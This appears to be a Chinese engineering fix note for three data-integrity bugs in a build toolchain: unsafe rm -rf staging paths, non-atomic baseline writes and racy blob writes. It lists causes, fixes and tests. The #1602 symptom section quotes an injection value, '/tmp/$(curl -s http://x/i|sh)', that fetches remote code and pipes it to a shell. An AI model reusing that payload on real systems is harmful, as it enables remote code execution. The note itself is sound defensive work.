# 三条 P2 数据完整性缺陷（2026-11-05，issue #1626 / #1602 / #1607）

## 现象

- #1602：`DSH_SNAPSHOT_STAGE=/root`（或漏写 ABI 段）→ 构建器 `rm -rf` 打到家目录上；
  `DSH_SNAPSHOT_STAGE='/tmp/$(curl -s http://x/i|sh)'` 能通过 `startsWith('/')` 校验并在清场时执行。
- #1607：`check-code-map.mjs --only --write` 在两次写之间被杀，留下「文档已是符号锚点、基线缺 symbolHashes」
  的半份；之后每次 `symbol-unbaselined`，`build-apk-013.ps1` 直接拒打包，且**重跑同一命令修不回来**。
- #1626：`writeBlob` 固定 tmp 名 + `.catch(() => {})` 吞掉 rename 失败 ⇒ 并发快照可落盘半截 blob，
  而「存在即返回」让这个坏 blob 永远不会被重写。

## 真因

三条都是「判据看着在、实际没覆盖那条路径」的不同形态：

- #1602：校验只有 `startsWith('/')` 一条，而这条值最终交给 `rm -rf`；清场又走 `bash -lc` + 双引号，
  于是「路径合法性」与「shell 字面量」两个属性一个都没被保证。
- #1607：单次写不是原子的（裸 `writeFileSync`），**两份文件之间的写序**也没有约束。写序这一半更隐蔽：
  文档先落地时，第二次运行会因为 `if (a.symbolForm) continue` 推不出任何改写，`rewrites` 为空，
  基线原样写回 —— 自愈路径被写序掐断。
- #1626：tmp 名是 `hash` 的函数而不是「这一次写」的函数；失败分支用空 catch 抹掉证据；
  「已存在」的判据是 `pathExists` 而不是「完整且内容正确」。

## 修法

- #1602：新增 `scripts/lib/snapshot-stage.mjs`（纯函数）：地板（`/home|/root|/data|/mnt` + 必含 `.dsh-stage`
  + `.dsh-stage` 之下必须有 ABI 段 + 禁控制字符与 `$`/反引号 + 禁 `.`/`..`/空段），清场命令统一走
  `rm -rf -- <shellQuote(path)>`。`scripts/lib/shell.mjs` 把 `wslNodeCommand` 里已有的 quote 抽成导出的
  `shellQuote`（同一份实现，不再复制）。`build-snapshot-013.mjs` 的校验与清场各改一行（净位移 0）。
- #1607：新增 `scripts/lib/atomic-write.mjs`（同目录 `.tmp-<pid>` + `renameSync`，与 `apply-patches.mjs` 同形）；
  `--only --write` 改为**先基线、后文档**；`--refresh-anchor-baseline` 与 `--derive-anchors --write` 的落盘
  同样换成原子写。
- #1626：tmp 名带 pid + 6 字节随机；开头判据从 `pathExists` 换成 `blobComplete`（长度 + 内容 + sha1）；
  rename 失败不再空 catch —— 目标已完整则返回，否则换新 tmp 重写。改动是 32 增 3 删，
  文件既有的 CRLF 行尾逐字节保留（`vendor/dsh-undo-savepoint/lib/core.mjs` 在 `.gitattributes` 里是 `-text`）。

## 判据（都能真打红）

- `scripts/snapshot-stage.test.mjs`（6 例）：地板正/负样本；清场命令在**真 bash** 里跑，注入形态的目录名
  必须被删掉且 payload 不得被执行；普通路径/带空格带引号路径必须真删；旧判据 `startsWith('/')` 的反证。
- `scripts/check-code-map-only-write.test.mjs`（6 例）：临时副本里真跑 `--only --write` 后同一份门禁必须
  PASSED；`--import` 预载让「第一处落盘后」自杀，重跑同一命令必须收敛；只切文档那一刀下基线必须已含新键；
  基线写到一半被杀后目标必须仍是完整可解析的旧基线。
- `vendor/dsh-undo-savepoint/test/blob-write-concurrency.test.mjs`（6 例）与
  `blob-write-tmp-unique.test.mjs`（2 例）：12 个并发写者压同一 hash 后落盘必须逐字节等于原文；
  预置半截目标必须被修好；完整副本不得被无谓重写；不残留 tmp；并发写者的临时路径必须**互不相同**。

负控（真打红，已复验）：

- #1602：清场退回双引号 → 注入用例红；地板退回 `startsWith('/')` → 地板用例红。
- #1607：写序退回「先文档后基线」→ 4 例红；落盘退回裸 `writeFileSync` → 4 例红。
- #1626：tmp 退回固定名 → 两组都红；完整性退回 `pathExists` → 两组都红。

## 复验

- `node scripts/check-code-map.mjs` → PASSED；`node scripts/check-release-gates.mjs` → PASSED（SKIP=1）；
  `node scripts/check-kotlin-comments.mjs` → PASSED；`node scripts/check-kotlin-test-count.mjs` → PASSED（gradle 之后跑）。
- **未做设备验证**：三条都不改变设备面行为。

## 与 #1619 的关系

#1619（`android_ui_scroll` 在纯 Shizuku 通道上忽略 screenId）在本分支起草期间已由 main 的 #1633 修好：
`plugins/dsh-android-manage/src/index.ts` 的 ADB 分支在动手前拒绝非 real 屏，回归用例是
`plugins/dsh-android-manage/test/ui-scroll-screen.test.mjs`（三例，判据同样是「不得发出 input swipe」）。
本轮据此撤回了自己那份等价修法，避免同一处两份实现；该 issue 未关闭，由 #1633 负责。
